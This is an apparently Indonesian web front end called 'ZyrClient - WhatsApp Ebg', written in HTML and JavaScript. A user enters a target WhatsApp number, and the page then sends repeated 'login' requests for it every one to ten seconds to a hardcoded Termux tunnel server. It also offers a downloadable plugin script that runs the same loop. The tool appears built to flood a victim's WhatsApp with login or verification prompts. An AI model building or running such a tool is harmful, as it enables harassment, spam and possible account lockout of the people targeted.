<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZyrClient - WA Ebg</title>
    <style>
        :root { --bg: linear-gradient(135deg, #0f172a, #1e3a8a, #4c1d95, #2563eb); --panel: rgba(30, 58, 138, 0.7); --magenta: #d946ef; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: monospace, sans-serif; color: white; }
        body { background: var(--bg); background-size: 400% 400%; animation: wave 15s ease infinite; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; }
        @keyframes wave { 0% { background-position: 0% 50%; } 100% { background-position: 100% 50%; } }
        
        .container { width: 100%; max-width: 700px; background: var(--panel); border: 1px solid rgba(59,130,246,0.5); border-radius: 20px; padding: 30px; text-align: center; backdrop-filter: blur(10px);}
        h1 { color: #3b82f6; margin-bottom: 5px; font-family: sans-serif; }
        h2 { font-size: 1.2rem; color: #cbd5e1; margin-bottom: 20px; font-family: sans-serif; }
        
        .img-box { width: 100%; height: 150px; background: #000; border-radius: 12px; margin-bottom: 20px; overflow: hidden; display: flex; align-items: center; justify-content: center;}
        .img-box img { width: 100%; height: 100%; object-fit: cover; }
        
        input, select { width: 100%; padding: 15px; background: rgba(0,0,0,0.4); border-radius: 12px; border: 2px solid #3b82f6; margin-bottom: 15px; font-size: 1rem; outline: none; }
        
        .btn-group { display: flex; gap: 15px; margin-bottom: 10px; }
        button { flex: 1; padding: 15px; border: none; border-radius: 12px; font-size: 1.1rem; font-weight: bold; cursor: pointer; transition: 0.3s; font-family: sans-serif; }
        
        #btnLogin { background: linear-gradient(90deg, #25D366, #128C7E); }
        #btnLogin:hover:not(:disabled) { box-shadow: 0 5px 15px rgba(37,211,102,0.4); transform: translateY(-2px); }
        #btnLogin:disabled { background: #64748b; cursor: not-allowed; }
        
        #btnStop { background: linear-gradient(90deg, #ef4444, #b91c1c); }
        #btnStop:hover:not(:disabled) { box-shadow: 0 5px 15px rgba(239,68,68,0.4); transform: translateY(-2px); }
        #btnStop:disabled { background: #64748b; cursor: not-allowed; }
        
        .plugin-btn { background: #1e3a8a; width: 100%; margin-top: 10px; }
        
        .monitor { background: #000; border: 1px solid #333; border-radius: 10px; padding: 15px; text-align: left; height: 200px; overflow-y: auto; color: #0f0; margin-bottom: 15px; font-size: 0.9rem; font-family: monospace; }
    </style>
</head>
<body>
    <h1>ZyrClient</h1>
    <h2>WhatsApp Ebg</h2>
    
    <div class="container">
        <div class="img-box">
            <img src="Wbg.png" alt="Wbg Logo" onerror="this.src='https://via.placeholder.com/600x150/128C7E/FFFFFF?text=Wbg.png';">
        </div>
        
        <input type="number" id="waNumber" placeholder="Nomor Global tanpa '+' (cth: 628123456789)">
        
        <select id="timeSelect">
            <option value="1000">1. 1 detik</option>
            <option value="5000">2. 5 detik</option>
            <option value="10000">3. 10 detik</option>
        </select>
        
        <div class="btn-group">
            <button id="btnLogin" onclick="startLogin()">Login</button>
            <button id="btnStop" onclick="stopLogin()" disabled>Stop</button>
        </div>
        
        <div class="monitor" id="monitorLog">
            > Standby console...
        </div>
        
        <button class="plugin-btn" onclick="downloadPluginWA()">Download Plugin</button>
    </div>
    <a href="index.html" style="display:block; margin-top:20px; color:#cbd5e1; font-family:sans-serif; text-decoration:none;">Kembali</a>

    <script>
        let intervalId = null;
        let isRunning = false;

        // Taruh URL https:// yang kamu dapatkan da:
        const URL_TUNNEL_TERMUX = "https://oufdu-112-215-200-88.run.pinggy-free.link";

        // Fungsi mencetak log pesan ke boks hitam monitor
        function logMsg(msg, color = "#0f0") {
            const m = document.getElementById('monitorLog');
            const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
            m.innerHTML += `<br><span style="color:${color}">[${time}] > ${msg}</span>`;
            m.scrollTop = m.scrollHeight;
        }

        // Fungsi REAL HTTP Request mengirim data nomor ke Server Termux
        async function sendLoginToServer(number) {
            try {
                const response = await fetch(`${URL_TUNNEL_TERMUX}/api/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target: number })
                });

                const result = await response.json();

                if (response.ok && result.status === 'success') {
                    // Menampilkan pesan sukses dari respons server Node.js Termux
                    logMsg(`Command success: ${result.message}`, "#25D366");
                } else {
                    logMsg(`Command gagal: ${result.message || 'Server menolak koneksi'}`, "#ef4444");
                }
            } catch (error) {
                // Terjadi apabila url salah, server mati, atau kendala jaringan internet
                logMsg(`Command gagal: Hubungan ke Termux Terputus (${error.message})`, "#ef4444");
            }
        }

        // Fungsi memicu loop pengiriman terus-menerus
        function startLogin() {
            const no = document.getElementById('waNumber').value.trim();
            const ms = parseInt(document.getElementById('timeSelect').value);
            
            if(!no) { 
                logMsg("Error: Nomor tidak boleh kosong!", "#ef4444"); 
                return; 
            }
            if(no.includes('+')) {
                logMsg("Error: Masukkan nomor tanpa karakter '+' !", "#ef4444");
                return;
            }
            
            if(isRunning) return;
            
            isRunning = true;
            document.getElementById('btnLogin').disabled = true;
            document.getElementById('btnStop').disabled = false;
            
            logMsg(`START: Menghubungkan ke server Termux. Mengirim loop login ke ${no} tiap ${ms/1000} dtk.`, "#38bdf8");
            
            // Tembakan data pertama secara instan
            sendLoginToServer(no);
            
            // Melakukan looping otomatis konstan berdasarkan tabel pilihan waktu
            intervalId = setInterval(() => {
                sendLoginToServer(no);
            }, ms);
        }

        // Fungsi menghentikan siklus looping
        function stopLogin() {
            if(!isRunning) return;
            
            clearInterval(intervalId); // Mematikan interval proses
            isRunning = false;
            
            document.getElementById('btnLogin').disabled = false;
            document.getElementById('btnStop').disabled = true;
            
            logMsg("STOP: Proses sinkronisasi login dihentikan.", "#fbbf24");
        }

        function downloadPluginWA() {
            const code = `
/* Plugin ZyrClient - WhatsApp Ebg (Real Loop Termux Backend Integration) */
let waInterval = null;
function zyrWaEbgStart(number, delayMs, serverUrl) {
    if(waInterval) clearInterval(waInterval);
    waInterval = setInterval(async () => {
        try {
            let res = await fetch(serverUrl + '/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ target: number })
            });
            let data = await res.json();
            console.log(data.status === "success" ? "Command success" : "Command gagal");
        } catch(e) {
            console.log("Command gagal: " + e.message);
        }
    }, delayMs);
}
function zyrWaEbgStop() {
    if(waInterval) clearInterval(waInterval);
    console.log("Stopped.");
}`;
            const blob = new Blob([code], { type: "text/javascript" });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = "ZyrWaEbgPlugin.js";
            a.click();
        }
    </script>
</body>
</html>
